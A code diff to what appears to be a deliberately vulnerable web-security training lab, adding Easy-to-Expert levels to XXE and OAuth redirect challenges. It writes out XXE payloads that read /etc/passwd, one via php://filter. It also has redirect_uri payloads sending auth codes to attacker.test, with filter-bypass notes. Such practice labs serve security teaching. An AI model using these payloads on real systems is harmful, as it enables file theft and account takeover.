@@ -78,9 +78,9 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <!-- 4. XXE -->
 <div class="card"><h2>4 · <code>import.php</code> (POST XML) <span class="flag-pill">🏁 XXE</span></h2>
   <p class="muted">Imports an XML order. External entities are resolved → read local files. <i>(needs <code>php-xml</code>)</i></p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_xml">&lt;?xml version="1.0"?&gt;
-&lt;!DOCTYPE x [&lt;!ENTITY e SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;order&gt;&lt;item&gt;&amp;e;&lt;/item&gt;&lt;/order&gt;</code>
+  <div class="levels" id="lv_xml"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('xml','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('xml','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('xml','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('xml','expert')">Expert</button></div>
+  <input type="hidden" id="lvl_xml" value="easy">
+  <details open><summary>💡 hint — <span class="note" id="note_xml"></span></summary><code class="pl" id="pl_xml"></code>
     <button type="button" class="ghost" onclick="fill('in_xml','pl_xml')">use this ▶</button></details>
   <textarea id="in_xml" placeholder="paste an XML document…"></textarea>
   <div><button type="button" onclick="sendXml()">Send XML ▶</button></div>
@@ -112,10 +112,12 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>7 · <code>oauth_authorize.php?redirect_uri=</code> <span class="flag-pill">🏁 OAuth</span></h2>
   <p class="muted">OAuth authorize endpoint. The <code>redirect_uri</code> isn't validated, so the victim's
      auth <code>code</code> can be sent to a host you control → replay it at <code>oauth_callback.php?code=</code>.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_rd">http://attacker.example/callback</code>
+  <div class="levels" id="lv_rd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('rd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('rd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('rd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('rd','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_rd"></span></summary><code class="pl" id="pl_rd"></code>
     <button type="button" class="ghost" onclick="fill('in_rd','pl_rd')">use this ▶</button>
-    <span class="muted"> · the code it issues is bound to “admin”; copy it to <code>oauth_callback.php?code=…</code></span></details>
+    <span class="muted"> · the issued <code>code=</code> (in the redirect) is bound to “admin” → replay at <code>oauth_callback.php?code=</code></span></details>
   <form method="get" action="oauth_authorize.php" target="r_rd" onsubmit="show('r_rd')">
+    <input type="hidden" name="level" id="lvl_rd" value="easy">
     <input type="text" id="in_rd" name="redirect_uri" placeholder="redirect_uri…"><button>Run ▶</button></form>
   <iframe name="r_rd" id="r_rd" class="res"></iframe></div>
 
@@ -145,10 +147,22 @@ function setLvl(card,lvl){
   var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
-['q','url','file','name','jwt'].forEach(function(c){ setLvl(c,'easy'); });
+PAYLOADS.rd={
+ easy:{p:"http://attacker.test/cb",n:"Easy — no validation; any host."},
+ medium:{p:"http://localhost@attacker.test/cb",n:"Medium — must start with http://localhost → @ userinfo trick (real host = attacker.test)."},
+ hard:{p:"http://localhost.attacker.test/cb",n:"Hard — '@' blocked → subdomain trick (host = localhost.attacker.test)."},
+ expert:{p:"http://localhost.attacker.test/cb",n:"Expert — host-shape check; same subdomain works (real world: a parser differential)."}
+};
+PAYLOADS.xml={
+ easy:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
+ medium:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Medium — 'SYSTEM' blocked → use PUBLIC."},
+ hard:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Hard — file:// blocked → php://filter, then base64-decode."},
+ expert:{p:'(advanced) inline <!ENTITY is blocked → use an external DTD or parameter entities.',n:"Expert — inline entities blocked → external/parameter-entity DTD (advanced)."}
+};
+['q','url','file','name','jwt','rd','xml'].forEach(function(c){ setLvl(c,'easy'); });
 function sendXml(){
   var out=document.getElementById('r_xml'); out.style.display='block'; out.textContent='sending…';
-  fetch('import.php',{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
+  fetch('import.php?level='+((document.getElementById('lvl_xml')||{}).value||'easy'),{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
     .then(r=>r.text()).then(t=>out.textContent=t).catch(e=>out.textContent='error: '+e);
 }
 </script>
